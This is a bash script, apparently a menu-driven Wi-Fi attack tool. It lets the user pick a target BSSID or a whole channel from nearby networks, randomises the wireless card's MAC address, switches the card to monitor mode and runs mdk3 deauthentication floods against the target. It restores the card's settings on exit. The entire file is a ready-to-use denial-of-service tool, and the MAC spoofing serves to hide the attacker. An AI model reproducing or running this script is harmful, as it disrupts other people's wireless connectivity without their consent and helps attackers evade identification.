#!/bin/bash

# TERMINAL COLORS
# https://github.com/125K/terminal-colors
NO_COLOR="\e[0m"
WHITE="\e[0;17m"
BOLD_WHITE="\e[1;37m"
BLACK="\e[0;30m"
BLUE="\e[0;34m"
BOLD_BLUE="\e[1;34m"
GREEN="\e[0;32m"
BOLD_GREEN="\e[1;32m"
CYAN="\e[0;36m"
BOLD_CYAN="\e[1;36m"
RED="\e[0;31m"
BOLD_RED="\e[1;31m"
PURPLE="\e[0;35m"
BOLD_PURPLE="\e[1;35m"
BROWN="\e[0;33m"
BOLD_YELLOW="\e[1;33m"
GRAY="\e[0;37m"
BOLD_GRAY="\e[1;30m"
# END OF TERMINAL COLORS

function coolexit()
{
	clear
	sleep 2
	ifconfig $WI down
	macchanger -p $WI
	iwconfig $WI mode managed
	ifconfig $WI up
	clear
	exit
}

function getIFCARD() {
        echo -e "$BOLD_WHITE[*] Your interfaces: "
		echo " "
        echo -e -n "$BOLD_WHITE"
        ifconfig | grep -e ": " | sed -e 's/: .*//g' | sed -e 's/^/   /'
        echo " "
        echo -n -e "$BOLD_WHITE[*] Select you interface $BOLD_RED>> "
        echo -n -e "$BOLD_WHITE"
}

function changeMAC() {
        ifconfig $WI down
        iwconfig $WI mode monitor
        macchanger -r $WI
        ifconfig $WI up
}
echo " "
echo -e "$BOLD_RED 1.$BOLD_WHITE Deauth a specific BSSID"
echo -e "$BOLD_RED 2.$BOLD_WHITE Deauth a whole channel"
echo " "
echo -n -e "$BOLD_WHITE[*] option $BOLD_RED>> $BOLD_WHITE"
read CHOICE
clear

if [ $CHOICE == 1 ]; then
	echo -e $NO_COLOR
	nmcli dev wifi
	echo " "
	echo -e -n $BOLD_WHITE
	echo -n "[*] Target BSSID >> "
	echo -e -n $BOLD_WHITE
	read BSSID
	clear

	echo " "
	getIFCARD
	read WI
	echo " "
	echo -e "$BOLD_RED[!]$BOLD_WHITE Starting the attack... Press $BOLD_RED CTRL+C $BOLD_WHITE to stop the attack."
	echo " "
	changeMAC
	trap coolexit EXIT
	mdk3 $WI d -t "$BSSID"
elif [ $CHOICE == 2 ]; then
	echo -e $NO_COLOR
	nmcli dev wifi
	echo " "
	echo -e -n $BOLD_WHITE
	echo -n "[*] Target channel >> "
	echo -e -n $BOLD_WHITE
	read CH
	clear
	echo " "
	getIFCARD
	read WI
	echo " "
	echo -e "$BOLD_RED[!]$BOLD_WHITE Starting the attack... Press $BOLD_RED CTRL+C $BOLD_WHITE to stop the attack."
	echo " "
	changeMAC
	trap coolexit EXIT
	mdk3 $WI d -c $CH
else
	echo -e "$BOLD_RED[*]$BOLD_WHITE Invalid option"
	echo -e "$BOLD_RED[*]$BOLD_WHITE Restart script"
	sleep 3
	coolexit
fi
